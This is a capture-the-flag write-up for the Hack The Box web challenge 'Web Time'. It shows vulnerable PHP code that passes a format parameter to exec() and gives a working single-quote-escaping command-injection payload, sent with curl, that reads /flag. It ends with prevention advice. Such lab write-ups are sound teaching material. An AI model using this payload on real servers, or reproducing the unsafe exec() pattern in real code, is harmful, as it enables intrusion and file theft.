---
title: "Web Time"
platform: "Hack The Box"
category: "Web"
difficulty: "Very Easy"
date: 2025-08-20
techniques: ["OS Command Injection", "Shell Escape"]
description: "OS command injection via PHP `exec()` — escaping single quotes in a `date '+...'` template to chain `cat /flag`."
lang: en
translation_key: web-time
---

| Info | Detail |
|------|--------|
| Platform | Hack The Box |
| Category | Web / Command Injection |
| Difficulty | Very Easy |
| Flag | `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_...}` |

---

## Overview

A web application that displays the current time and date. Two buttons pass a `format` parameter to the server. Source code is provided, revealing a PHP application using `exec()` to run the `date` command.

## Source Code Analysis (White Box)

### TimeController.php
```php
$format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
$time = new TimeModel($format);
```
No sanitization — user input goes directly to the model.

### TimeModel.php (VULNERABLE)
```php
public function __construct($format)
{
    $this->command = "date '+" . $format . "' 2>&1";
}

public function getTime()
{
    $time = exec($this->command);
    return isset($time) ? $time : '?';
}
```

The `$format` is concatenated directly into a shell command wrapped in single quotes. The `exec()` function executes it on the OS.

## The Problem with Single Quotes

In bash, single quotes prevent ALL expansion:
- `$(command)` is NOT executed
- `` `command` `` is NOT executed  
- Variables `$VAR` are NOT expanded

The only way to escape: **close the quote with another `'`**

## Exploitation

### Failed Attempts

| Payload | Why it failed |
|---------|---------------|
| `%0acat /flag` (newline) | Inside single quotes, newline is literal |
| `$(cat /flag)` | Inside single quotes, $() is not expanded |
| `` `cat /flag` `` | Inside single quotes, backticks are literal |

### Working Payload

```
' && cat /flag && echo '
```

URL encoded:
```bash
curl "http://TARGET:PORT/?format=%27%20%26%26%20cat%20/flag%20%26%26%20echo%20%27"
```

This produces on the server:
```bash
date '+' && cat /flag && echo '' 2>&1
```

Breaking it down:
1. `'` closes the original single quote
2. `&&` chains the next command (AND operator)
3. `cat /flag` reads the flag file
4. `&& echo '` opens a new quote to match the closing one the code adds

**Result:** `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_...}`

## Key Takeaways

- **Read the source code first** when provided — it reveals the exact vulnerability
- **Understand the shell context** before injecting — single quotes require escaping
- **`exec()` with user input = command injection** — always
- **URL encoding is essential** for special characters: `%27`=`'`, `%20`=space, `%26`=`&`
- **Use `curl` instead of browser** for payloads with special characters
- Prevention: use `escapeshellarg()`, input whitelisting, or native language functions instead of `exec()`

## MITRE ATT&CK

| Tactic | Technique | ID |
|--------|-----------|-----|
| Execution | Command and Scripting Interpreter | T1059 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Collection | Data from Local System | T1005 |

**OWASP:** A03:2021 – Injection
